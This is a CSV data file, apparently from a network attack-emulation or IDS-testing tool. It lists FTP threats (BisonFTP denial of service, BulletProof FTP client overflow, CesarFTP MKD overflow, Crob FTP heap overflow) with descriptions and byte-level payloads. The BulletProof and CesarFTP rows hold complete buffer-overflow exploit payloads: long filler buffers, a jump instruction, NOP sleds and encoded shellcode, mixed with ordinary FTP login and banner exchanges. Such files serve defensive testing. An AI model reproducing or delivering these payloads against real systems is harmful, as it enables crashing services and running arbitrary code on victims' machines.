XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
bisonftp_dos.xml,"BisonFTP Remote Denial Of Service Vulnerability
",This threat exploits a flaw in BisonFTP servers by sending a large amount of data after a successful login thereby crashing the service. BisonFTP is a ftp application that typically listens on port 21,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
bisonftp_dos.xml,"BisonFTP Remote Denial Of Service Vulnerability
",This threat exploits a flaw in BisonFTP servers by sending a large amount of data after a successful login thereby crashing the service. BisonFTP is a ftp application that typically listens on port 21,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
bisonftp_dos.xml,"BisonFTP Remote Denial Of Service Vulnerability
",This threat exploits a flaw in BisonFTP servers by sending a large amount of data after a successful login thereby crashing the service. BisonFTP is a ftp application that typically listens on port 21,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿bulletproofftp_client_bof.xml,BulletProof FTP (Client) V2.45 Remote Buffer Overflow,This threat uses a malicious ftp  server to send a large buffer containing arbitrary code to leverage a buffer overflow vulnerability in systems using the Bulletproof ftp client. Bulletproof ftp is a client application that typically connects to ftp servers listening on port 21.,FTP,TCP,USER user||0D 0A ||PASS pass||0D 0A||
bulletproofftp_client_bof.xml,BulletProof FTP (Client) V2.45 Remote Buffer Overflow,This threat uses a malicious ftp  server to send a large buffer containing arbitrary code to leverage a buffer overflow vulnerability in systems using the Bulletproof ftp client. Bulletproof ftp is a client application that typically connects to ftp servers listening on port 21.,FTP,TCP,220 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA||EB 06 90 90 ||iZXw1||C9 83 E9 DB D9 EE D9 ||t$||F4 ||[||81 ||s||13 D8 22 ||r||E4 83 EB FC E2 F4 ||$||CA ||4||E4 D8 22 F9 A1 E4 A9 0E E1 A0 ||#||9D ||o||97 3A F9 BB F8 ||#||99 07 F6 ||k||F9 D0 ||S#||9C D5 18 BB DE ||`||18 ||Vu%||12 ||/s&3||D6 ||I||B0 FC ||&||07 07 ||S}V||E5 ||3D||F9 E8 93 A9 ||-||F8 D9 C9 F9 F8 ||S#||99 ||m||84 06 ||v'||E9 E2 16 ||o||98 12 F7 ||$||A0 ||-||F9 A4 D4 A9 02 F8 ||u||A9 1A EC ||1)r||E4 D8 A9 ||2||D0 DD ||^r||E4 D8 A9 1A D8 87 13 84 84 8E C9 ||||8C ||(||A8 ||v||BB B0 BA 8C ||n||D6 ||u||8D 03 ||0||CC 8D 1B ||'A||13 88 BB 0C 17 9C BD 22 ||r||E4 0D 0D 0A||
﻿cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,user phar||0D 0A||
cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,pass xxxxxxx||0D 0A||
cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,MKD ||0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A 0A ||AAAe||82 A5 7C 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ||1||C9 83 E9 DB D9 EE D9 ||t$||F4 ||[||81 ||s||13 D8 22 ||r||E4 83 EB FC E2 F4 ||$||CA ||4||E4 D8 22 F9 A1 E4 A9 0E E1 A0 ||#||9D ||o||97 3A F9 BB F8 ||#||99 07 F6 ||k||F9 D0 ||S#||9C D5 18 BB DE ||`||18 ||Vu%||12 ||/s&3||D6 ||I||B0 FC ||&||07 07 ||S}V||E5 ||3D||F9 E8 93 A9 ||-||F8 D9 C9 F9 F8 ||S#||99 ||m||84 06 ||v'||E9 E2 16 ||o||98 12 F7 ||$||A0 ||-||F9 A4 D4 A9 02 F8 ||u||A9 1A EC ||1)r||E4 D8 A9 ||2||D0 DD ||^r||E4 D8 A9 1A D8 87 13 84 84 8E C9 ||||8C ||(||A8 ||v||BB B0 BA 8C ||n||D6 ||u||8D 03 ||0||CC 8D 1B ||'A||13 88 BB 0C 17 9C BD 22 ||r||E4 0D 0A||
cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,220 Spire||6e ||tFTPD Server (We||6c ||c||6f 6d ||e t||6f || b||6c ||aster) ||5b 3a 3a ||ffff||3a ||59||2e ||31||2e ||131||2e ||44||5d 0d 0a||
cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,331 Passw||6f ||rd required||0d 0a||
cesarftp_bof.xml,CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit,This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21.,FTP,TCP,230 User ||6c 6f ||gged i||6e 2e 0d 0a||
﻿crobftp_dos.xml,Crob FTP Server Remote Heap Buffer Overflow Vulnerability,This threat demonstrates a flaw in the Crob FTP Server by using a large buffer to cause a denial of service condition. Crob FTP Server is ftp server software that typically listens on port 21. ,FTP,TCP,user test||0D 0A||
crobftp_dos.xml,Crob FTP Server Remote Heap Buffer Overflow Vulnerability,This threat demonstrates a flaw in the Crob FTP Server by using a large buffer to cause a denial of service condition. Crob FTP Server is ftp server software that typically listens on port 21. ,FTP,TCP,PASS justatest||0D 0A||
